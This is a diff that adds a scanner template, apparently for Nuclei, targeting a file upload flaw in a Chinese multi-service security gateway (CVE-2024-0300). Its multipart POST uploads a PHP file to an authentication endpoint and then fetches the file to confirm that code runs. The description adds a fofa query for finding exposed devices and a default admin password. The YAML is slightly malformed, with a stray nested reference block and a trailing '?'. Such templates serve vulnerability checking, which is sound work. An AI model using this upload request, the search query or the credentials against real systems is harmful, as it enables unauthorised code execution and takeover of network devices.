@@ -1,0 +1,56 @@
+id: smart-security-gateway-arbitrary-file-upload
+
+info:
+  name: "Smart 多业务安全网关 useratte 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="Smart--管理平台"
+          默认账户凭证为 admin / b3f9t8k7
+      reference: 
+        - https://example.com/cve-details
+  reference:
+  - CVE-2024-0300
+  tags: Smart 多业务安全网关
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /useratte/userattestation.php HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: 
+    Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
+
+    -----------------------------42328904123665875270630079328
+    Content-Disposition: form-data; name="web_img"; filename="NTest.php"
+    Content-Type: application/octet-stream
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    -----------------------------42328904123665875270630079328
+    Content-Disposition: form-data; name="id_type"
+
+    1
+    -----------------------------42328904123665875270630079328
+    Content-Disposition: form-data; name="1_ck"
+
+    1_radhttp
+    -----------------------------42328904123665875270630079328
+    Content-Disposition: form-data; name="hidwel"
+
+    set
+    -----------------------------42328904123665875270630079328?
+- raw:
+  - |
+    GET /boot/web/upload/weblogo/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
